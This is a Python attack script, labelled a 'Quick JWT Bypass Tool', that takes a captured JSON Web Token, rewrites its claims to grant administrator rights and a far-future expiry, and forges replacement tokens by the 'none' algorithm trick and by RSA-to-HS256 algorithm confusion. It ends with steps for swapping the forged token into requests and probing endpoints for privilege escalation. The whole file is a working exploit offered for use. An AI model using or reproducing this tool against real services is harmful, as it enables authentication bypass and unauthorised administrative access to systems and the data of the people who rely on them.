#!/usr/bin/env python3
"""
Quick JWT Bypass Tool
Quickly generate bypass tokens from existing JWT
Usage: python3 jwt_quick_bypass.py <JWT_TOKEN> [admin|user]
"""

import base64
import json
import hmac
import hashlib
import sys
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

def url_safe_b64_decode(data):
    """Decode URL-safe base64"""
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    data = data.replace('-', '+').replace('_', '/')
    return base64.b64decode(data)

def url_safe_b64_encode(data):
    """Encode to URL-safe base64"""
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def decode_jwt_token(token):
    """Decode JWT token and return header, payload, signature"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None, None, None
            
        header = json.loads(url_safe_b64_decode(parts[0]))
        payload = json.loads(url_safe_b64_decode(parts[1]))
        signature = parts[2]
        
        return header, payload, signature
    except Exception as e:
        print(f"Error decoding token: {e}")
        return None, None, None

def create_rsa_public_key_from_n_e(n_b64, e=65537):
    """Create RSA public key from modulus (n) and exponent (e)"""
    try:
        n_bytes = url_safe_b64_decode(n_b64)
        n = int.from_bytes(n_bytes, 'big')
        public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
        return public_key
    except Exception as e:
        print(f"Error creating public key: {e}")
        return None

def create_bypass_tokens(payload, public_key):
    """Create both none and HS256 bypass tokens"""
    tokens = {}
    
    # None algorithm bypass
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = url_safe_b64_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = url_safe_b64_encode(json.dumps(payload, separators=(',', ':')).encode())
    tokens['none'] = f"{header_b64}.{payload_b64}."
    
    # HS256 algorithm confusion
    if public_key:
        header = {"alg": "HS256", "typ": "JWT"}
        
        # Get public key in PEM format
        pem_key = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        # Encode header and payload
        header_b64 = url_safe_b64_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = url_safe_b64_encode(json.dumps(payload, separators=(',', ':')).encode())
        
        # Create signature using public key as HMAC secret
        signing_input = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            pem_key,
            signing_input.encode('utf-8'),
            hashlib.sha256
        ).digest()
        
        signature_b64 = url_safe_b64_encode(signature)
        tokens['hs256'] = f"{header_b64}.{payload_b64}.{signature_b64}"
    
    return tokens

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 jwt_quick_bypass.py <JWT_TOKEN> [admin|user]")
        print("Example: python3 jwt_quick_bypass.py 'eyJ...' admin")
        return
    
    token = sys.argv[1]
    role_type = sys.argv[2] if len(sys.argv) > 2 else "admin"
    
    # Decode the original token
    header, payload, signature = decode_jwt_token(token)
    if not header or not payload:
        print("Failed to decode JWT token!")
        return
    
    print(f"=== Original Token (Algorithm: {header.get('alg', 'unknown')}) ===")
    print(json.dumps(payload, indent=2))
    print()
    
    # Modify payload for privilege escalation
    if role_type.lower() == "admin":
        payload['sub'] = 'admin'
        payload['role'] = 'admin'
        payload['admin'] = True
        payload['exp'] = 9999999999  # Far future expiration
        if 'name' in payload:
            payload['name'] = 'Administrator'
    elif role_type.lower() == "user":
        payload['sub'] = 'user'
        payload['role'] = 'user'
        payload['admin'] = False
    
    print(f"=== Modified Payload ({role_type.upper()}) ===")
    print(json.dumps(payload, indent=2))
    print()
    
    # Create RSA public key from your provided modulus
    public_key_n = "wDZXKpTN6h1-wyZsxL..."
    public_key = create_rsa_public_key_from_n_e(public_key_n)
    
    # Generate bypass tokens
    tokens = create_bypass_tokens(payload, public_key)
    
    print("=== Bypass Tokens ===")
    print(f"[NONE] {tokens['none']}")
    print()
    if 'hs256' in tokens:
        print(f"[HS256] {tokens['hs256']}")
        print()
    
    print("=== Usage ===")
    print("1. Copy either token above")
    print("2. Replace the original JWT in your requests")
    print("3. Test different endpoints for privilege escalation")
    print(f"4. Use ./jwt_test.sh <URL> '<TOKEN>' for quick testing")

if __name__ == "__main__":
    main()

